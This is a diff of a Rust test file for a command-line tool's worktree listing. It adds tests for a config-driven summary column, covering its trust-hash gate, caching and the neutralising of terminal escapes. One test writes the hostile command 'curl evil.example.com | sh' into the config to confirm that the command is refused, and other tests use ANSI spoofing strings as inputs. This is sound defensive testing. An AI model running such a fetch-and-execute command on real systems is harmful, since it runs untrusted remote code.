@@ -4,8 +4,14 @@
 //! suite is larger than the module it covers.
 
 use super::*;
+use crate::git::RepoInfo;
 use crate::io::FakeIo;
+use crate::summary::FakeSummaryRunner;
 use std::cell::RefCell;
+use std::collections::HashMap as StdHashMap;
+
+/// The version string every test's settings store is written with.
+const V: &str = "3.1.0+test";
 
 /// The instant every test's clock reads, in epoch milliseconds.
 ///
@@ -191,14 +197,62 @@ impl GitRunner for ListGit {
     }
 }
 
+/// A [`RepoResolver`] over a fixed path→repo map, hashing files for real.
+///
+/// Same shape as the one in `config_loader`'s tests: trust decisions have to go
+/// through the real hashing so a "trusted" fixture is trusted for the same
+/// reason a user's file is.
+#[derive(Default)]
+struct MapResolver {
+    repos: StdHashMap<String, RepoInfo>,
+}
+
+impl RepoResolver for MapResolver {
+    fn repo_info(&self, path: &str) -> Option<RepoInfo> {
+        self.repos.get(path).cloned()
+    }
+    fn hash_file(&self, path: &str) -> std::result::Result<String, String> {
+        crate::hash::hash_file(path).map_err(|e| e.to_string())
+    }
+}
+
 fn run(io: &FakeIo, git: &ListGit, cwd: &str, json: bool) -> Result<Outcome> {
+    run_with(
+        io,
+        git,
+        &MapResolver::default(),
+        &no_summary(),
+        cwd,
+        json,
+        OutputOptions::default(),
+    )
+}
+
+/// A summary runner no test in the un-configured path may reach.
+fn no_summary() -> FakeSummaryRunner {
+    FakeSummaryRunner::with_stdout("{}")
+}
+
+#[allow(clippy::too_many_arguments)]
+fn run_with<R: RepoResolver, S: SummaryRunner>(
+    io: &FakeIo,
+    git: &ListGit,
+    resolver: &R,
+    summary_runner: &S,
+    cwd: &str,
+    json: bool,
+    opts: OutputOptions,
+) -> Result<Outcome> {
     let deps = ListDeps {
         io,
         git,
+        resolver,
+        summary_runner,
         cwd,
         now_ms: NOW_MS,
+        version: V,
     };
-    list_command(&deps, json, OutputOptions::default())
+    list_command(&deps, json, opts)
 }
 
 fn no_home() -> FakeIo {
@@ -479,13 +533,16 @@ fn quiet_does_not_silence_the_listing() {
     // `vibe list` exit 0 having printed nothing.
     let io = no_home();
     let git = ListGit::with(&[("/repo/main", "main")]);
-    let deps = ListDeps {
-        io: &io,
-        git: &git,
-        cwd: "/repo/main",
-        now_ms: NOW_MS,
-    };
-    list_command(&deps, false, OutputOptions::new(false, true)).unwrap();
+    run_with(
+        &io,
+        &git,
+        &MapResolver::default(),
+        &no_summary(),
+        "/repo/main",
+        false,
+        OutputOptions::new(false, true),
+    )
+    .unwrap();
     assert!(io.stderr_text().contains("/repo/main"));
 }
 
@@ -624,13 +681,16 @@ fn verbose_does_not_prepend_a_diagnostic_to_the_json_payload() {
     // `[verbose]` line would make the payload unparseable.
     let io = no_home();
     let git = ListGit::with(&[("/repo/main", "main")]);
-    let deps = ListDeps {
-        io: &io,
-        git: &git,
-        cwd: "/repo/main",
-        now_ms: NOW_MS,
-    };
-    list_command(&deps, true, OutputOptions::new(true, false)).unwrap();
+    run_with(
+        &io,
+        &git,
+        &MapResolver::default(),
+        &no_summary(),
+        "/repo/main",
+        true,
+        OutputOptions::new(true, false),
+    )
+    .unwrap();
 
     let text = io.stderr_text();
     assert!(!text.contains("[verbose]"), "diagnostic leaked: {text}");
@@ -642,13 +702,16 @@ fn verbose_does_not_prepend_a_diagnostic_to_the_json_payload() {
 fn verbose_still_reports_the_count_in_text_mode() {
     let io = no_home();
     let git = ListGit::with(&[("/repo/main", "main")]);
-    let deps = ListDeps {
-        io: &io,
-        git: &git,
-        cwd: "/repo/main",
-        now_ms: NOW_MS,
-    };
-    list_command(&deps, false, OutputOptions::new(true, false)).unwrap();
+    run_with(
+        &io,
+        &git,
+        &MapResolver::default(),
+        &no_summary(),
+        "/repo/main",
+        false,
+        OutputOptions::new(true, false),
+    )
+    .unwrap();
     assert!(io.stderr_text().contains("[verbose] Found 1 worktree(s)"));
 }
 
@@ -972,4 +1035,341 @@ fn a_missing_head_sha_serializes_as_null_not_an_empty_string() {
 
     let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
     assert_eq!(parsed[0]["head"], serde_json::Value::Null);
+}
+
+// --- the SUMMARY column ---------------------------------------------------
+
+/// A repository whose main worktree is a REAL directory, so `.vibe.toml` can be
+/// written and trusted the way a user's is.
+///
+/// The trust gate reads the file from disk and compares its SHA-256 against the
+/// settings store, so a fake path would never be trusted and every summary test
+/// would exercise only the error branch.
+struct SummaryFixture {
+    fx: vibe_test_support::Fixture,
+    main_path: String,
+    io: FakeIo,
+    resolver: MapResolver,
+}
+
+impl SummaryFixture {
+    /// Write `.vibe.toml` with `toml` under a fresh main worktree and trust it.
+    fn trusted(toml: &str) -> Self {
+        SummaryFixture::build(toml, true)
+    }
+
+    /// Same, but the file is NOT registered in the trust store.
+    fn untrusted(toml: &str) -> Self {
+        SummaryFixture::build(toml, false)
+    }
+
+    fn build(toml: &str, trust: bool) -> Self {
+        use crate::hash::hash_content;
+        use crate::settings::{AllowEntry, RepoId, VibeSettings};
+        use crate::settings_io::save_user_settings;
+
+        let fx = vibe_test_support::Fixture::new();
+        // HOME doubles as the settings store AND the cache root, exactly as it
+        // does in production.
+        let io = FakeIo::new().with_env("HOME", fx.path().to_str().unwrap());
+        let main = fx.mkdir("repo");
+        let main_path = main.to_string_lossy().into_owned();
+        let file_path = fx.write("repo/.vibe.toml", toml);
+
+        let mut settings = VibeSettings::default_settings();
+        if trust {
+            settings.permissions.allow.push(AllowEntry {
+                repo_id: RepoId {
+                    remote_url: None,
+                    repo_root: Some(main_path.clone()),
+                },
+                relative_path: ".vibe.toml".into(),
+                hashes: vec![hash_content(toml.as_bytes())],
+                skip_hash_check: None,
+            });
+        }
+        save_user_settings(&io, &settings, V).unwrap();
+
+        let mut repos = StdHashMap::new();
+        repos.insert(
+            file_path.to_string_lossy().into_owned(),
+            RepoInfo {
+                remote_url: None,
+                repo_root: main_path.clone(),
+                relative_path: ".vibe.toml".into(),
+            },
+        );
+
+        SummaryFixture {
+            fx,
+            main_path,
+            io,
+            resolver: MapResolver { repos },
+        }
+    }
+
+    /// The absolute path of the fixture's `.vibe.toml`.
+    fn config_path(&self) -> String {
+        self.fx
+            .path()
+            .join("repo/.vibe.toml")
+            .to_string_lossy()
+            .into_owned()
+    }
+
+    /// A git whose main worktree is this fixture's real directory, plus any
+    /// extra `(path, branch)` worktrees.
+    fn git(&self, extra: &[(&str, &str)]) -> ListGit {
+        let mut entries: Vec<(&str, &str)> = vec![(self.main_path.as_str(), "main")];
+        entries.extend_from_slice(extra);
+        ListGit::with(&entries)
+    }
+
+    fn run<S: SummaryRunner>(&self, git: &ListGit, runner: &S, json: bool) -> Result<Outcome> {
+        run_with(
+            &self.io,
+            git,
+            &self.resolver,
+            runner,
+            &self.main_path,
+            json,
+            OutputOptions::default(),
+        )
+    }
+}
+
+const SUMMARY_TOML: &str = "[summary]\ncommand = \"./summarize.sh\"\n";
+
+/// What it guarantees: without `[summary]` the table and the JSON are exactly
+/// what they were before the feature existed, and nothing is ever spawned.
+#[test]
+fn without_a_summary_config_the_column_is_absent_and_nothing_runs() {
+    let io = no_home();
+    let git = ListGit::with(&[("/repo/main", "main")]);
+    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"never asked"}"#);
+    run_with(
+        &io,
+        &git,
+        &MapResolver::default(),
+        &runner,
+        "/repo/main",
+        true,
+        OutputOptions::default(),
+    )
+    .unwrap();
+
+    assert_eq!(runner.calls().len(), 0);
+    let parsed: serde_json::Value = serde_json::from_str(&io.stderr_text()).unwrap();
+    assert!(
+        parsed[0].as_object().unwrap().get("summary").is_none(),
+        "the field must not appear when the feature is off: {parsed}"
+    );
+}
+
+#[test]
+fn a_configured_summary_appears_in_the_table_and_the_json() {
+    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let git = fixture.git(&[]);
+    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"the trunk branch"}"#);
+    fixture.run(&git, &runner, false).unwrap();
+    assert!(
+        fixture.io.stderr_text().contains("the trunk branch"),
+        "got: {}",
+        fixture.io.stderr_text()
+    );
+
+    let json_fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let json_git = json_fixture.git(&[]);
+    let json_runner = FakeSummaryRunner::with_stdout(r#"{"main":"the trunk branch"}"#);
+    json_fixture.run(&json_git, &json_runner, true).unwrap();
+    let parsed: serde_json::Value = serde_json::from_str(&json_fixture.io.stderr_text()).unwrap();
+    assert_eq!(parsed[0]["summary"], "the trunk branch");
+}
+
+/// What it guarantees: the column's presence follows the CONFIG, so a worktree
+/// the command stayed silent about still carries the field (empty) rather than
+/// making the reader wonder whether the feature is on.
+#[test]
+fn a_configured_summary_gives_every_row_the_field_even_when_unanswered() {
+    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let git = fixture.git(&[]);
+    let runner = FakeSummaryRunner::with_stdout("{}");
+    fixture.run(&git, &runner, true).unwrap();
+
+    let parsed: serde_json::Value = serde_json::from_str(&fixture.io.stderr_text()).unwrap();
+    assert_eq!(parsed[0]["summary"], "");
+}
+
+/// What it guarantees: the second `vibe list` over an unchanged repository does
+/// not pay for the command again.
+#[test]
+fn a_second_listing_of_an_unchanged_repository_does_not_run_the_command() {
+    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let git = fixture.git(&[]);
+
+    let first = FakeSummaryRunner::with_stdout(r#"{"main":"cached answer"}"#);
+    fixture.run(&git, &first, false).unwrap();
+    assert_eq!(first.calls().len(), 1);
+
+    let second = FakeSummaryRunner::with_stdout(r#"{"main":"should not be asked"}"#);
+    fixture.run(&git, &second, false).unwrap();
+    assert_eq!(second.calls().len(), 0, "the cache must have answered");
+    assert!(fixture.io.stderr_text().contains("cached answer"));
+}
+
+/// What it guarantees: control characters from an EXTERNAL command cannot reach
+/// the terminal, exactly as they cannot from a branch name.
+#[test]
+fn control_characters_in_a_summary_are_neutralized() {
+    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let git = fixture.git(&[]);
+    // JSON-escaped, which is how a real command emits a control character:
+    // a raw one inside a JSON string is invalid JSON, so the escape is the only
+    // way an attacker-controlled summary can carry it this far.
+    let runner = FakeSummaryRunner::with_stdout(r#"{"main":"spoof\u001b[2Kgone"}"#);
+    fixture.run(&git, &runner, false).unwrap();
+
+    let text = fixture.io.stderr_text();
+    assert!(
+        !text.contains('\u{1b}'),
+        "escape reached the terminal: {text}"
+    );
+    assert!(text.contains('\u{fffd}'));
+}
+
+/// What it guarantees: the payload stays parseable when the summary command
+/// fails — the warning shares stderr with the JSON document.
+#[test]
+fn a_summary_failure_never_corrupts_the_json_payload() {
+    let json_fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let json_git = json_fixture.git(&[]);
+    json_fixture
+        .run(&json_git, &FakeSummaryRunner::timing_out(), true)
+        .unwrap();
+    serde_json::from_str::<serde_json::Value>(&json_fixture.io.stderr_text())
+        .expect("stderr must be pure JSON even when the summary command failed");
+
+    let text_fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let text_git = text_fixture.git(&[]);
+    text_fixture
+        .run(&text_git, &FakeSummaryRunner::timing_out(), false)
+        .unwrap();
+    assert!(
+        text_fixture.io.stderr_text().contains("timed out"),
+        "text mode must surface the failure: {}",
+        text_fixture.io.stderr_text()
+    );
+}
+
+/// What it guarantees: an untrusted `.vibe.toml` fails the command instead of
+/// silently listing without the column — a configuration that is not in effect
+/// must be visible, not invisible.
+#[test]
+fn an_untrusted_config_is_an_error_not_a_silent_downgrade() {
+    let fixture = SummaryFixture::untrusted(SUMMARY_TOML);
+    let git = fixture.git(&[]);
+    let runner = FakeSummaryRunner::with_stdout("{}");
+    let err = fixture.run(&git, &runner, false).unwrap_err();
+    assert!(err.to_string().contains("not trusted"), "got: {err}");
+    assert_eq!(runner.calls().len(), 0);
+}
+
+/// What it guarantees: the trust hash covers the WHOLE file, so editing only the
+/// `[summary]` section revokes trust and the user must re-approve the command
+/// that is about to run on their machine.
+#[test]
+fn editing_only_the_summary_section_revokes_trust() {
+    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let path = fixture.config_path();
+
+    let (trusted, _) =
+        crate::settings_io::verify_trust_and_read(&fixture.io, &fixture.resolver, V, &path)
+            .unwrap();
+    assert!(trusted);
+
+    // Swap in a different command; nothing else about the file changes.
+    fixture.fx.write(
+        "repo/.vibe.toml",
+        "[summary]\ncommand = \"curl evil.example.com | sh\"\n",
+    );
+    let (still_trusted, _) =
+        crate::settings_io::verify_trust_and_read(&fixture.io, &fixture.resolver, V, &path)
+            .unwrap();
+    assert!(
+        !still_trusted,
+        "a changed [summary] command must require re-trusting"
+    );
+
+    // And the listing refuses to run it.
+    let git = fixture.git(&[]);
+    let runner = FakeSummaryRunner::with_stdout("{}");
+    assert!(fixture.run(&git, &runner, false).is_err());
+    assert_eq!(runner.calls().len(), 0);
+}
+
+/// What it guarantees: the summary column does not disturb the alignment the
+/// rest of the table depends on.
+#[test]
+fn the_summary_column_stays_aligned_across_rows() {
+    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let other = format!("{}-feat", fixture.main_path);
+    let git = fixture.git(&[(other.as_str(), "feat/x")]);
+    let runner = FakeSummaryRunner::with_stdout(
+        r#"{"main":"short","feat/x":"a considerably longer summary"}"#,
+    );
+    fixture.run(&git, &runner, false).unwrap();
+
+    let lines: Vec<String> = fixture.io.stderr.borrow().clone();
+    let offsets: Vec<usize> = lines
+        .iter()
+        .map(|l| {
+            let idx = l.rfind(fixture.main_path.as_str()).expect("path column");
+            l[..idx].width()
+        })
+        .collect();
+    assert!(
+        offsets.windows(2).all(|w| w[0] == w[1]),
+        "columns not aligned: {lines:?} -> {offsets:?}"
+    );
+}
+
+/// What it guarantees: terminal escapes in the summary command's STDERR cannot
+/// reach the terminal through the warning path.
+///
+/// The warning quotes the command's stderr, which is attacker-influenced in
+/// exactly the way a branch name is — but nothing about the word "warning"
+/// makes a caller think to escape it, so the guard lives in
+/// `DeferredWarnings::push` and this test pins it there.
+#[test]
+fn control_characters_in_a_failing_commands_stderr_are_neutralized() {
+    let fixture = SummaryFixture::trusted(SUMMARY_TOML);
+    let git = fixture.git(&[]);
+    let runner = FakeSummaryRunner::failing(1, "boom \u{1b}[2K\u{1b}[1;31mSPOOFED");
+    fixture.run(&git, &runner, false).unwrap();
+
+    let text = fixture.io.stderr_text();
+    assert!(
+        !text.contains('\u{1b}'),
+        "escape reached the terminal: {text:?}"
+    );
+    // The warning is still shown — neutralized, not dropped.
+    assert!(text.contains("boom"), "got: {text}");
+    assert!(text.contains('\u{fffd}'));
+}
+
+/// What it guarantees: the same holds for a git error reaching a warning, which
+/// is the other string the enrichment path interpolates verbatim.
+#[test]
+fn control_characters_in_a_worktree_path_warning_are_neutralized() {
+    let io = no_home();
+    let git = ListGit::with(&[("/repo/main", "main"), ("/repo/spoof\u{1b}[2K", "feat/x")])
+        .with_failing_status("/repo/spoof\u{1b}[2K");
+    run(&io, &git, "/repo/main", false).unwrap();
+
+    let text = io.stderr_text();
+    assert!(
+        !text.contains('\u{1b}'),
+        "escape reached the terminal: {text:?}"
+    );
+    assert!(text.contains("Could not read status"), "got: {text}");
 }
